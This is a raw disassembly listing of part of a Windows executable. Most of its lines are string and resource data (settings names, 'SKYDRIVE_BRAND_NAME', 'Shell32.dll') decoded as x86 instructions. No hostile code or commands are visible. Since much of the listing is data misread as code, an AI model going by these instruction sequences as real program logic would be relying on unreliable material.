  40244f:	add    BYTE PTR [eax+eax*1+0x61],cl
  402453:	add    BYTE PTR [ebx+0x0],dh
  402456:	je     0x402458
  402458:	inc    esp
  402459:	add    BYTE PTR [ecx+0x0],ch
  40245c:	popa   
  40245d:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402461:	add    BYTE PTR [edi+0x0],ah
  402464:	push   ebx
  402465:	add    BYTE PTR [eax+0x0],ch
  402468:	outs   dx,DWORD PTR ds:[esi]
  402469:	add    BYTE PTR [edi+0x0],dh
  40246c:	outs   dx,BYTE PTR ds:[esi]
  40246d:	add    BYTE PTR [eax],al
  40246f:	add    BYTE PTR [esi+0x0],ah
  402472:	imul   eax,DWORD PTR [eax],0x730072
  402478:	je     0x40247a
  40247a:	inc    ebp
  40247b:	add    BYTE PTR [eax+0x0],bh
  40247e:	arpl   WORD PTR [eax],ax
  402480:	add    BYTE PTR gs:[ebp+0x0],ah
  402484:	add    BYTE PTR fs:[ebp+0x0],ah
  402488:	add    BYTE PTR fs:[eax+eax*1+0x69],al
  40248d:	add    BYTE PTR [ecx+0x0],ah
  402490:	ins    BYTE PTR es:[edi],dx
  402491:	add    BYTE PTR [edi+0x0],ch
  402494:	add    BYTE PTR [si+0x0],dl
  402498:	jb     0x40249a
  40249a:	imul   eax,DWORD PTR [eax],0x670067
  4024a0:	add    BYTE PTR gs:[edx+0x0],dh
  4024a4:	inc    esp
  4024a5:	add    BYTE PTR [ebp+0x0],ah
  4024a8:	ins    BYTE PTR es:[edi],dx
  4024a9:	add    BYTE PTR [ecx+0x0],ah
  4024ac:	jns    0x4024ae
  4024ae:	dec    ecx
  4024af:	add    BYTE PTR [esi+0x0],ch
  4024b2:	inc    esp
  4024b3:	add    BYTE PTR [ecx+0x0],ah
  4024b6:	jns    0x4024b8
  4024b8:	jae    0x4024ba
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	add    BYTE PTR [eax],al
  4024be:	add    BYTE PTR [eax],al
  4024c0:	add    BYTE PTR gs:[eax+0x0],bh
  4024c4:	arpl   WORD PTR [eax],ax
  4024c6:	add    BYTE PTR gs:[ebp+0x0],ah
  4024ca:	add    BYTE PTR fs:[ebp+0x0],ah
  4024ce:	add    BYTE PTR fs:[eax+eax*1+0x69],al
  4024d3:	add    BYTE PTR [ecx+0x0],ah
  4024d6:	ins    BYTE PTR es:[edi],dx
  4024d7:	add    BYTE PTR [edi+0x0],ch
  4024da:	add    BYTE PTR [si+0x0],dl
  4024de:	jb     0x4024e0
  4024e0:	imul   eax,DWORD PTR [eax],0x670067
  4024e6:	add    BYTE PTR gs:[edx+0x0],dh
  4024ea:	inc    esp
  4024eb:	add    BYTE PTR [ebp+0x0],ah
  4024ee:	ins    BYTE PTR es:[edi],dx
  4024ef:	add    BYTE PTR [ecx+0x0],ah
  4024f2:	jns    0x4024f4
  4024f4:	dec    ecx
  4024f5:	add    BYTE PTR [esi+0x0],ch
  4024f8:	inc    esp
  4024f9:	add    BYTE PTR [ecx+0x0],ah
  4024fc:	jns    0x4024fe
  4024fe:	jae    0x402500
	...
  402508:	jo     0x40250a
  40250a:	popa   
  40250b:	add    BYTE PTR [edi+0x0],ah
  40250e:	add    BYTE PTR gs:0x65005300,bh
  402515:	add    BYTE PTR [eax+eax*1+0x74],dh
  402519:	add    BYTE PTR [ecx+0x0],ch
  40251c:	outs   dx,BYTE PTR ds:[esi]
  40251d:	add    BYTE PTR [edi+0x0],ah
  402520:	jae    0x402522
  402522:	push   eax
  402523:	add    BYTE PTR [ecx+0x0],ah
  402526:	add    BYTE PTR [di+0x0],ah
  40252a:	push   ebx
  40252b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40252f:	add    BYTE PTR [edx+0x0],dh
  402532:	popa   
  402533:	add    BYTE PTR [edi+0x0],ah
  402536:	add    BYTE PTR gs:[ebx+0x0],dl
  40253a:	add    BYTE PTR gs:[esi+0x0],ch
  40253e:	jae    0x402540
  402540:	add    BYTE PTR gs:[ebx+0x0],dl
  402544:	je     0x402546
  402546:	outs   dx,DWORD PTR ds:[esi]
  402547:	add    BYTE PTR [edx+0x0],dh
  40254a:	popa   
  40254b:	add    BYTE PTR [edi+0x0],ah
  40254e:	add    BYTE PTR gs:[edi+0x0],cl
  402552:	jbe    0x402554
  402554:	add    BYTE PTR gs:[edx+0x0],dh
  402558:	jbe    0x40255a
  40255a:	imul   eax,DWORD PTR [eax],0x770065
	...
  402568:	jo     0x40256a
  40256a:	popa   
  40256b:	add    BYTE PTR [edi+0x0],ah
  40256e:	add    BYTE PTR gs:0x65005300,bh
  402575:	add    BYTE PTR [eax+eax*1+0x74],dh
  402579:	add    BYTE PTR [ecx+0x0],ch
  40257c:	outs   dx,BYTE PTR ds:[esi]
  40257d:	add    BYTE PTR [edi+0x0],ah
  402580:	jae    0x402582
  402582:	push   eax
  402583:	add    BYTE PTR [ecx+0x0],ah
  402586:	add    BYTE PTR [di+0x0],ah
  40258a:	dec    edi
  40258b:	add    BYTE PTR [esi+0x0],ch
  40258e:	add    BYTE PTR gs:[eax+eax*1+0x72],al
  402593:	add    BYTE PTR [ecx+0x0],ch
  402596:	jbe    0x402598
  402598:	add    BYTE PTR gs:[ebx+0x0],dl
  40259c:	je     0x40259e
  40259e:	outs   dx,DWORD PTR ds:[esi]
  40259f:	add    BYTE PTR [edx+0x0],dh
  4025a2:	popa   
  4025a3:	add    BYTE PTR [edi+0x0],ah
  4025a6:	add    BYTE PTR gs:[esi],ah
  4025a9:	add    BYTE PTR [eax+eax*1+0x61],dh
  4025ad:	add    BYTE PTR [edx+0x0],dh
  4025b0:	add    BYTE PTR [di+0x0],ah
  4025b4:	je     0x4025b6
  4025b6:	cmp    eax,0x79005300
  4025bb:	add    BYTE PTR [ebx+0x0],dh
  4025be:	je     0x4025c0
  4025c0:	add    BYTE PTR gs:[ebp+0x0],ch
  4025c4:	push   ebx
  4025c5:	add    BYTE PTR [ebp+0x0],ah
  4025c8:	je     0x4025ca
  4025ca:	je     0x4025cc
  4025cc:	imul   eax,DWORD PTR [eax],0x67006e
  4025d2:	jae    0x4025d4
  4025d4:	pop    edi
  4025d5:	add    BYTE PTR [edi+0x0],cl
  4025d8:	outs   dx,BYTE PTR ds:[esi]
  4025d9:	add    BYTE PTR [ebp+0x0],ah
  4025dc:	inc    esp
  4025dd:	add    BYTE PTR [edx+0x0],dh
  4025e0:	imul   eax,DWORD PTR [eax],0x650076
  4025e6:	pop    edi
  4025e7:	add    BYTE PTR [ebp+0x0],cl
  4025ea:	popa   
  4025eb:	add    BYTE PTR [esi+0x0],ch
  4025ee:	popa   
  4025ef:	add    BYTE PTR [edi+0x0],ah
  4025f2:	add    BYTE PTR gs:[edi+0x0],cl
  4025f6:	outs   dx,BYTE PTR ds:[esi]
  4025f7:	add    BYTE PTR [ebp+0x0],ah
  4025fa:	inc    esp
  4025fb:	add    BYTE PTR [edx+0x0],dh
  4025fe:	imul   eax,DWORD PTR [eax],0x650076
  402604:	push   eax
  402605:	add    BYTE PTR [eax+eax*1+0x61],ch
  402609:	add    BYTE PTR [esi+0x0],ch
  40260c:	add    BYTE PTR es:[ecx+0x0],ch
  402610:	outs   dx,BYTE PTR ds:[esi]
  402611:	add    BYTE PTR [esi+0x0],dh
  402614:	outs   dx,DWORD PTR ds:[esi]
  402615:	add    BYTE PTR [ebx+0x0],ch
  402618:	add    BYTE PTR gs:0x72007400,bh
  40261f:	add    BYTE PTR [ebp+0x0],dh
  402622:	add    BYTE PTR gs:[eax],al
  402625:	add    BYTE PTR [eax],al
  402627:	add    BYTE PTR [ebx+0x0],al
  40262a:	ins    BYTE PTR es:[edi],dx
  40262b:	add    BYTE PTR [edi+0x0],ch
  40262e:	jne    0x402630
  402630:	add    BYTE PTR fs:[esi+0x0],cl
  402634:	outs   dx,DWORD PTR ds:[esi]
  402635:	add    BYTE PTR [eax+eax*1+0x69],dh
  402639:	add    BYTE PTR [esi+0x0],ah
  40263c:	imul   eax,DWORD PTR [eax],0x610063
  402642:	je     0x402644
  402644:	imul   eax,DWORD PTR [eax],0x6e006f
  40264a:	jae    0x40264c
  40264c:	inc    esp
  40264d:	add    BYTE PTR [ecx+0x0],ch
  402650:	popa   
  402651:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402655:	add    BYTE PTR [edi+0x0],ah
  402658:	add    BYTE PTR [eax],al
  40265a:	add    BYTE PTR [eax],al
  40265c:	dec    esp
  40265d:	add    BYTE PTR [edi+0x0],ch
  402660:	ja     0x402662
  402662:	push   ebx
  402663:	add    BYTE PTR [eax+eax*1+0x6f],dh
  402667:	add    BYTE PTR [edx+0x0],dh
  40266a:	popa   
  40266b:	add    BYTE PTR [edi+0x0],ah
  40266e:	add    BYTE PTR gs:[esi+0x0],cl
  402672:	outs   dx,DWORD PTR ds:[esi]
  402673:	add    BYTE PTR [eax+eax*1+0x69],dh
  402677:	add    BYTE PTR [esi+0x0],ah
  40267a:	imul   eax,DWORD PTR [eax],0x610063
  402680:	je     0x402682
  402682:	imul   eax,DWORD PTR [eax],0x6e006f
  402688:	jae    0x40268a
  40268a:	inc    esp
  40268b:	add    BYTE PTR [ecx+0x0],ch
  40268e:	popa   
  40268f:	add    BYTE PTR [eax+eax*1+0x6f],ch
  402693:	add    BYTE PTR [edi+0x0],ah
  402696:	add    BYTE PTR [eax],al
  402698:	inc    ebx
  402699:	add    BYTE PTR [ecx+0x0],ah
  40269c:	je     0x40269e
  40269e:	popa   
  40269f:	add    BYTE PTR [ebx+0x0],dh
  4026a2:	je     0x4026a4
  4026a4:	jb     0x4026a6
  4026a6:	outs   dx,DWORD PTR ds:[esi]
  4026a7:	add    BYTE PTR [eax+0x0],dh
  4026aa:	push   0x63006900
  4026af:	add    BYTE PTR [edx+0x0],dl
  4026b2:	add    BYTE PTR gs:[ebx+0x0],dh
  4026b6:	je     0x4026b8
  4026b8:	outs   dx,DWORD PTR ds:[esi]
  4026b9:	add    BYTE PTR [edx+0x0],dh
  4026bc:	add    BYTE PTR gs:[esi+0x0],al
  4026c0:	popa   
  4026c1:	add    BYTE PTR [ecx+0x0],ch
  4026c4:	ins    BYTE PTR es:[edi],dx
  4026c5:	add    BYTE PTR [ebp+0x0],dh
  4026c8:	jb     0x4026ca
  4026ca:	add    BYTE PTR gs:[eax+eax*1+0x69],al
  4026cf:	add    BYTE PTR [ecx+0x0],ah
  4026d2:	ins    BYTE PTR es:[edi],dx
  4026d3:	add    BYTE PTR [edi+0x0],ch
  4026d6:	add    BYTE PTR [bx+si],al
  4026d9:	add    BYTE PTR [eax],al
  4026db:	add    BYTE PTR [edi+0x0],dl
  4026de:	popa   
  4026df:	add    BYTE PTR [edx+0x0],dh
  4026e2:	outs   dx,BYTE PTR ds:[esi]
  4026e3:	add    BYTE PTR [ecx+0x0],ch
  4026e6:	outs   dx,BYTE PTR ds:[esi]
  4026e7:	add    BYTE PTR [edi+0x0],ah
  4026ea:	push   esp
  4026eb:	add    BYTE PTR [ebp+0x0],ah
  4026ee:	js     0x4026f0
  4026f0:	je     0x4026f2
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	inc    ebx
  4026f5:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4026f9:	add    BYTE PTR [ebp+0x0],dh
  4026fc:	add    BYTE PTR fs:[esi+0x0],cl
  402700:	outs   dx,DWORD PTR ds:[esi]
  402701:	add    BYTE PTR [eax+eax*1+0x69],dh
  402705:	add    BYTE PTR [esi+0x0],ah
  402708:	imul   eax,DWORD PTR [eax],0x610063
  40270e:	je     0x402710
  402710:	imul   eax,DWORD PTR [eax],0x6e006f
  402716:	jae    0x402718
  402718:	add    BYTE PTR [eax],al
  40271a:	add    BYTE PTR [eax],al
  40271c:	push   edx
  40271d:	add    BYTE PTR [ebp+0x0],ah
  402720:	jae    0x402722
  402722:	je     0x402724
  402724:	outs   dx,DWORD PTR ds:[esi]
  402725:	add    BYTE PTR [edx+0x0],dh
  402728:	add    BYTE PTR gs:[esi+0x0],al
  40272c:	popa   
  40272d:	add    BYTE PTR [ecx+0x0],ch
  402730:	ins    BYTE PTR es:[edi],dx
  402731:	add    BYTE PTR [ebp+0x0],dh
  402734:	jb     0x402736
  402736:	add    BYTE PTR gs:[eax],al
  402739:	add    BYTE PTR [eax],al
  40273b:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40273f:	add    BYTE PTR [edi+0x0],dh
  402742:	push   ebx
  402743:	add    BYTE PTR [eax+eax*1+0x6f],dh
  402747:	add    BYTE PTR [edx+0x0],dh
  40274a:	popa   
  40274b:	add    BYTE PTR [edi+0x0],ah
  40274e:	add    BYTE PTR gs:[eax],al
  402751:	add    BYTE PTR [eax],al
  402753:	add    BYTE PTR [edx],dl
  402755:	sbb    ah,BYTE PTR [ebx-0x4333cdb3]
  40275b:	dec    ecx
  40275c:	mov    dl,0xcc
  40275e:	push   es
  40275f:	or     eax,0xfcbaf2bc
  402764:	or     esi,ecx
  402766:	push   edx
  402767:	inc    esp
  402768:	mov    BYTE PTR [edi+eiz*4],al
  40276b:	dec    esp
  40276c:	test   al,0x96
  40276e:	(bad)  
  40276f:	icebp  
  402770:	inc    eax
  402771:	nop
  402772:	jne    0x4027bd
	...
  40277c:	rol    BYTE PTR [eax],0x0
  40277f:	add    BYTE PTR [eax],al
  402781:	add    BYTE PTR [eax],al
  402783:	inc    esi
  402784:	(bad)  
  402785:	pop    ss
  402786:	add    BYTE PTR [edx+0x25],ch
  402789:	fucomip st,st(3)
  40278b:	inc    esi
  40278c:	mov    dl,BYTE PTR [esi-0x637720c8]
  402792:	mov    ch,0xb1
  402794:	int3   
  402795:	mov    dh,BYTE PTR [ebp+eax*1+0x11e29426]
  40279c:	xchg   esi,eax
  40279d:	lock jns 0x40281e
  4027a0:	popa   
  4027a1:	mov    BYTE PTR [eax-0x65],dh
  4027a4:	inc    ecx
  4027a5:	adc    DWORD PTR [esi+ebp*1+0x47567f97],edx
  4027ac:	mov    edx,0xdeec9d1d
  4027b1:	mov    DWORD PTR [edx+0x3d],ecx
  4027b4:	add    BYTE PTR [eax],al
  4027b6:	add    BYTE PTR [eax],al
  4027b8:	mov    BYTE PTR [eax],ch
  4027ba:	inc    eax
  4027bb:	add    BYTE PTR [eax-0x27ffbfd8],dh
  4027c1:	sub    BYTE PTR [eax+0x0],al
  4027c4:	add    BYTE PTR [eax],al
  4027c6:	add    BYTE PTR [eax],al
  4027c8:	inc    eax
  4027c9:	add    BYTE PTR ds:0x79005300,ah
  4027cf:	add    BYTE PTR [ebx+0x0],dh
  4027d2:	je     0x4027d4
  4027d4:	add    BYTE PTR gs:[ebp+0x0],ch
  4027d8:	push   edx
  4027d9:	add    BYTE PTR [edi+0x0],ch
  4027dc:	outs   dx,DWORD PTR ds:[esi]
  4027dd:	add    BYTE PTR [eax+eax*1+0x25],dh
  4027e1:	add    BYTE PTR [eax+eax*1+0x53],bl
  4027e5:	add    BYTE PTR [ecx+0x0],bh
  4027e8:	jae    0x4027ea
  4027ea:	je     0x4027ec
  4027ec:	add    BYTE PTR gs:[ebp+0x0],ch
  4027f0:	xor    eax,DWORD PTR [eax]
  4027f2:	xor    al,BYTE PTR [eax]
  4027f4:	pop    esp
  4027f5:	add    BYTE PTR [ebx+0x0],dl
  4027f8:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  4027fd:	add    BYTE PTR [ecx+0x0],ch
  402800:	outs   dx,BYTE PTR ds:[esi]
  402801:	add    BYTE PTR [edi+0x0],ah
  402804:	push   ebx
  402805:	add    BYTE PTR [ecx+0x0],bh
  402808:	outs   dx,BYTE PTR ds:[esi]
  402809:	add    BYTE PTR [ebx+0x0],ah
  40280c:	inc    ebx
  40280d:	add    BYTE PTR [edi+0x0],ch
  402810:	jb     0x402812
  402812:	add    BYTE PTR gs:[esi],ch
  402815:	add    BYTE PTR [eax+eax*1+0x6c],ah
  402819:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40281d:	add    BYTE PTR ds:0x30003100,ch
  402823:	add    BYTE PTR [edx],dh
  402825:	add    BYTE PTR [eax+eax*1],dh
  402828:	add    BYTE PTR [eax],al
  40282a:	add    BYTE PTR [eax],al
  40282c:	outs   dx,BYTE PTR ds:[esi]
  40282d:	add    BYTE PTR [eax+eax*1+0x64],dh
  402831:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402835:	add    BYTE PTR [esi],ch
  402837:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40283b:	add    BYTE PTR [eax+eax*1+0x0],ch
  40283f:	add    BYTE PTR [esp+eiz*2+0x72],cl
  402843:	inc    esi
  402844:	popa   
  402845:	jae    0x4028bb
  402847:	inc    esi
  402848:	popa   
  402849:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x64616f4c
  402851:	gs jb  0x402897
  402854:	popa   
  402855:	ins    BYTE PTR es:[edi],dx
  402856:	ins    BYTE PTR es:[edi],dx
  402857:	outs   dx,DWORD PTR ds:[esi]
  402858:	jne    0x4028ce
  40285a:	add    BYTE PTR [eax],al
  40285c:	push   edx
  40285d:	je     0x4028cb
  40285f:	dec    esi
  402860:	je     0x4028b5
  402862:	je     0x4028c5
  402864:	je     0x4028db
  402866:	jae    0x4028bc
  402868:	outs   dx,DWORD PTR ds:[esi]
  402869:	inc    esp
  40286a:	outs   dx,DWORD PTR ds:[esi]
  40286b:	jae    0x4028b2
  40286d:	jb     0x4028e1
  40286f:	outs   dx,DWORD PTR ds:[esi]
  402870:	jb     0x4028c0
  402872:	outs   dx,DWORD PTR ds:[esi]
  402873:	push   esp
  402874:	bound  eax,QWORD PTR gs:[eax]
  402877:	add    BYTE PTR [edx+0x61],ah
  40287a:	and    BYTE PTR fs:[ecx+0x6c],ah
  40287e:	ins    BYTE PTR es:[edi],dx
  40287f:	outs   dx,DWORD PTR ds:[esi]
  402880:	arpl   WORD PTR [ecx+0x74],sp
  402883:	imul   ebp,DWORD PTR [edi+0x6e],0x530000
  40288a:	dec    ebx
  40288b:	add    BYTE PTR [ecx+0x0],bl
  40288e:	inc    esp
  40288f:	add    BYTE PTR [edx+0x0],dl
  402892:	dec    ecx
  402893:	add    BYTE PTR [esi+0x0],dl
  402896:	inc    ebp
  402897:	add    BYTE PTR [edi+0x0],bl
  40289a:	inc    edx
  40289b:	add    BYTE PTR [edx+0x0],dl
  40289e:	inc    ecx
  40289f:	add    BYTE PTR [esi+0x0],cl
  4028a2:	inc    esp
  4028a3:	add    BYTE PTR [edi+0x0],bl
  4028a6:	dec    esi
  4028a7:	add    BYTE PTR [ecx+0x0],al
  4028aa:	dec    ebp
  4028ab:	add    BYTE PTR [ebp+0x0],al
  4028ae:	add    BYTE PTR [eax],al
  4028b0:	push   ebx
  4028b1:	add    BYTE PTR [ebx+0x0],cl
  4028b4:	pop    ecx
  4028b5:	add    BYTE PTR [eax+eax*1+0x52],al
  4028b9:	add    BYTE PTR [ecx+0x0],cl
  4028bc:	push   esi
  4028bd:	add    BYTE PTR [ebp+0x0],al
  4028c0:	pop    edi
  4028c1:	add    BYTE PTR [edx+0x0],al
  4028c4:	push   edx
  4028c5:	add    BYTE PTR [ecx+0x0],al
  4028c8:	dec    esi
  4028c9:	add    BYTE PTR [eax+eax*1+0x2d],al
  4028cd:	add    BYTE PTR [esi+0x0],cl
  4028d0:	inc    ecx
  4028d1:	add    BYTE PTR [ebp+0x0],cl
  4028d4:	inc    ebp
  4028d5:	add    BYTE PTR [eax],al
  4028d7:	add    BYTE PTR [ebx+0x0],dl
  4028da:	dec    ebx
  4028db:	add    BYTE PTR [ecx+0x0],bl
  4028de:	inc    esp
  4028df:	add    BYTE PTR [edx+0x0],dl
  4028e2:	dec    ecx
  4028e3:	add    BYTE PTR [esi+0x0],dl
  4028e6:	inc    ebp
  4028e7:	add    BYTE PTR [edi+0x0],bl
  4028ea:	inc    edx
  4028eb:	add    BYTE PTR [edx+0x0],dl
  4028ee:	inc    ecx
  4028ef:	add    BYTE PTR [esi+0x0],cl
  4028f2:	inc    esp
  4028f3:	add    BYTE PTR [edi+0x0],bl
  4028f6:	add    BYTE PTR [eax],al
  4028f8:	push   ebx
  4028f9:	add    BYTE PTR [eax+0x0],ch
  4028fc:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  402901:	add    BYTE PTR [eax],al
  402903:	add    BYTE PTR [ebx+0x0],dl
  402906:	push   0x6c006500
  40290b:	add    BYTE PTR [eax+eax*1+0x53],ch
  40290f:	add    BYTE PTR [eax+eax*1+0x79],dh
  402913:	add    BYTE PTR [eax+eax*1+0x65],ch
  402917:	add    BYTE PTR [esi],ch
  402919:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40291d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402921:	add    BYTE PTR [eax],al
  402923:	add    BYTE PTR [eax],al
  402925:	add    BYTE PTR [eax],al
  402927:	add    BYTE PTR ds:0x79005300,ah
  40292d:	add    BYTE PTR [ebx+0x0],dh
  402930:	je     0x402932
  402932:	add    BYTE PTR gs:[ebp+0x0],ch
  402936:	push   edx
  402937:	add    BYTE PTR [edi+0x0],ch
  40293a:	outs   dx,DWORD PTR ds:[esi]
  40293b:	add    BYTE PTR [eax+eax*1+0x25],dh
  40293f:	add    BYTE PTR [eax+eax*1+0x53],bl
  402943:	add    BYTE PTR [ecx+0x0],bh
  402946:	jae    0x402948
  402948:	je     0x40294a
  40294a:	add    BYTE PTR gs:[ebp+0x0],ch
  40294e:	xor    eax,DWORD PTR [eax]
  402950:	xor    al,BYTE PTR [eax]
  402952:	pop    esp
  402953:	add    BYTE PTR [ebx+0x0],dl
  402956:	push   0x6c006500
  40295b:	add    BYTE PTR [eax+eax*1+0x53],ch
  40295f:	add    BYTE PTR [eax+eax*1+0x79],dh
  402963:	add    BYTE PTR [eax+eax*1+0x65],ch
  402967:	add    BYTE PTR [esi],ch
  402969:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40296d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402971:	add    BYTE PTR [eax],al
  402973:	add    BYTE PTR [esi+esi*2-0x66],cl
  402977:	push   edi
  402978:	fld    QWORD PTR [ebx+0x62]
  40297b:	inc    ebx
  40297c:	mov    ebx,0xb4a85f67
  402981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402982:	adc    edx,DWORD PTR ds:0xdec7d0c
  402988:	arpl   WORD PTR [ebp+0x64aa4759],di
  40298e:	lods   eax,DWORD PTR ds:[esi]
  40298f:	out    dx,eax
  402990:	xlat   BYTE PTR ds:[ebx]
  402991:	or     eax,0x127d9acf
  402996:	mov    edx,0xea10a845
  40299b:	inc    esi
  40299c:	mov    dh,BYTE PTR [edi+0x7890ea56]
  4029a2:	xchg   esp,eax
  4029a3:	cmp    al,0x32
  4029a5:	sub    eax,0x6e9e3421
  4029aa:	loop   0x4029bd
  4029ac:	mov    ebp,0x622b6ba0
  4029b1:	mov    BYTE PTR [eax-0x65],dh
	...
  4029c4:	cmp    BYTE PTR [edi+ebx*4],bh
  4029c7:	push   ebp
  4029c8:	add    BYTE PTR [eax],al
  4029ca:	add    BYTE PTR [eax],al
  4029cc:	add    al,BYTE PTR [eax]
  4029ce:	add    BYTE PTR [eax],al
  4029d0:	das    
  4029d1:	add    BYTE PTR [eax],al
  4029d3:	add    BYTE PTR [eax-0x6fffffd6],dl
  4029d9:	push   ds
  4029da:	add    BYTE PTR [eax],al
  4029dc:	add    BYTE PTR [eax],al
  4029de:	add    BYTE PTR [eax],al
  4029e0:	cmp    BYTE PTR [edi+ebx*4],bh
  4029e3:	push   ebp
  4029e4:	add    BYTE PTR [eax],al
  4029e6:	add    BYTE PTR [eax],al
  4029e8:	or     eax,0xac000000
  4029ed:	add    al,BYTE PTR [eax]
  4029ef:	add    ah,dl
  4029f1:	sub    al,BYTE PTR [eax]
  4029f3:	add    ah,dl
  4029f5:	push   ds
	...
  402a16:	add    BYTE PTR [eax],al
  402a18:	push   0x0
	...
  402a51:	add    BYTE PTR [eax],al
  402a53:	add    BYTE PTR [eax+edx*4],al
  402a56:	inc    eax
  402a57:	add    BYTE PTR [eax+0x300402a],al
  402a5d:	add    BYTE PTR [eax],al
  402a5f:	add    ah,ch
  402a61:	mov    eax,ds:0x40
  402a66:	add    BYTE PTR [eax],al
  402a68:	sub    al,0x10
  402a6a:	inc    eax
  402a6b:	add    BYTE PTR [ebp+0x0],bl
  402a6e:	add    BYTE PTR [eax],al
  402a70:	add    BYTE PTR ds:0x0,dh
	...
  402a7e:	add    BYTE PTR [eax],al
  402a80:	mov    al,0x61
  402a82:	add    BYTE PTR [eax],al
  402a84:	add    eax,0x25000071
  402a89:	jno    0x402a8b
  402a8b:	add    BYTE PTR [eax],al
  402a8d:	add    BYTE PTR [eax],al
  402a8f:	add    BYTE PTR [edx+0x53],dl
  402a92:	inc    esp
  402a93:	push   ebx
  402a94:	pop    ecx
  402a95:	add    bh,BYTE PTR [eax+0x725e1add]
  402a9b:	inc    edi
  402a9c:	xchg   ebx,eax
  402a9d:	dec    esp
  402a9e:	repz loopne 0x402ab9
  402aa1:	cmp    eax,0x1efca
  402aa6:	add    BYTE PTR [eax],al
  402aa8:	inc    ebx
  402aa9:	ins    BYTE PTR es:[edi],dx
  402aaa:	outs   dx,DWORD PTR ds:[esi]
  402aab:	jne    0x402b11
  402aad:	dec    esi
  402aae:	outs   dx,DWORD PTR ds:[esi]
  402aaf:	je     0x402b1a
  402ab1:	imul   sp,WORD PTR [ebx+0x61],0x6974
  402ab7:	outs   dx,DWORD PTR ds:[esi]
  402ab8:	outs   dx,BYTE PTR ds:[esi]
  402ab9:	jae    0x402ae9
  402abb:	jo     0x402b21
  402abd:	bound  eax,QWORD PTR [eax]
	...
  402ad3:	add    BYTE PTR [edi+0x43],al
  402ad6:	push   esp
  402ad7:	dec    esp
  402ad8:	add    BYTE PTR [eax],dl
  402ada:	add    BYTE PTR [eax],al
  402adc:	add    al,0x0
  402ade:	add    BYTE PTR [eax],al
  402ae0:	cs inc ebx
  402ae2:	push   edx
  402ae3:	push   esp
  402ae4:	and    al,0x58
  402ae6:	inc    ebx
  402ae7:	inc    ecx
  402ae8:	add    BYTE PTR [eax],al
  402aea:	add    BYTE PTR [eax],al
  402aec:	add    al,0x10
  402aee:	add    BYTE PTR [eax],al
  402af0:	add    al,0x0
  402af2:	add    BYTE PTR [eax],al
  402af4:	cs inc ebx
  402af6:	push   edx
  402af7:	push   esp
  402af8:	and    al,0x58
  402afa:	inc    ebx
  402afb:	inc    ecx
  402afc:	inc    ecx
  402afd:	add    BYTE PTR [eax],al
  402aff:	add    BYTE PTR [eax],cl
  402b01:	adc    BYTE PTR [eax],al
  402b03:	add    BYTE PTR [eax],dl
  402b05:	add    BYTE PTR [eax],al
  402b07:	add    BYTE PTR [esi],ch
  402b09:	inc    ebx
  402b0a:	push   edx
  402b0b:	push   esp
  402b0c:	and    al,0x58
  402b0e:	inc    ebx
  402b0f:	push   ebp
  402b10:	add    BYTE PTR [eax],al
  402b12:	add    BYTE PTR [eax],al
  402b14:	sbb    BYTE PTR [eax],dl
  402b16:	add    BYTE PTR [eax],al
  402b18:	add    al,0x0
  402b1a:	add    BYTE PTR [eax],al
  402b1c:	cs inc ebx
  402b1e:	push   edx
  402b1f:	push   esp
  402b20:	and    al,0x58
  402b22:	inc    ebx
  402b23:	pop    edx
  402b24:	add    BYTE PTR [eax],al
  402b26:	add    BYTE PTR [eax],al
  402b28:	sbb    al,0x10
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	add    al,0x0
  402b2e:	add    BYTE PTR [eax],al
  402b30:	cs inc ebx
  402b32:	push   edx
  402b33:	push   esp
  402b34:	and    al,0x58
  402b36:	dec    ecx
  402b37:	inc    ecx
  402b38:	add    BYTE PTR [eax],al
  402b3a:	add    BYTE PTR [eax],al
  402b3c:	and    BYTE PTR [eax],dl
  402b3e:	add    BYTE PTR [eax],al
  402b40:	add    al,0x0
  402b42:	add    BYTE PTR [eax],al
  402b44:	cs inc ebx
  402b46:	push   edx
  402b47:	push   esp
  402b48:	and    al,0x58
  402b4a:	dec    ecx
  402b4b:	inc    ecx
  402b4c:	inc    ecx
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	add    BYTE PTR [eax+edx*1],ah
  402b52:	add    BYTE PTR [eax],al
  402b54:	add    al,0x0
  402b56:	add    BYTE PTR [eax],al
  402b58:	cs inc ebx
  402b5a:	push   edx
  402b5b:	push   esp
  402b5c:	and    al,0x58
  402b5e:	dec    ecx
  402b5f:	pop    ecx
  402b60:	add    BYTE PTR [eax],al
  402b62:	add    BYTE PTR [eax],al
  402b64:	sub    BYTE PTR [eax],dl
  402b66:	add    BYTE PTR [eax],al
  402b68:	add    al,0x0
  402b6a:	add    BYTE PTR [eax],al
  402b6c:	cs inc ebx
  402b6e:	push   edx
  402b6f:	push   esp
  402b70:	and    al,0x58
  402b72:	dec    ecx
  402b73:	pop    edx
  402b74:	add    BYTE PTR [eax],al
  402b76:	add    BYTE PTR [eax],al
  402b78:	sub    al,0x10
  402b7a:	add    BYTE PTR [eax],al
  402b7c:	je     0x402b7f
  402b7e:	add    BYTE PTR [eax],al
  402b80:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  402b88:	add    BYTE PTR [eax],al
  402b8a:	add    BYTE PTR [eax],al
  402b8c:	mov    al,ds:0xe0000011
  402b91:	sbb    BYTE PTR [eax],al
  402b93:	add    BYTE PTR [esi],ch
  402b95:	jb     0x402bfb
  402b97:	popa   
  402b98:	je     0x402bfb
  402b9a:	add    BYTE PTR [eax],al
  402b9c:	sub    BYTE PTR [edx],0x0
  402b9f:	add    BYTE PTR [eax+eax*1],cl
  402ba2:	add    BYTE PTR [eax],al
  402ba4:	cs jb  0x402c0b
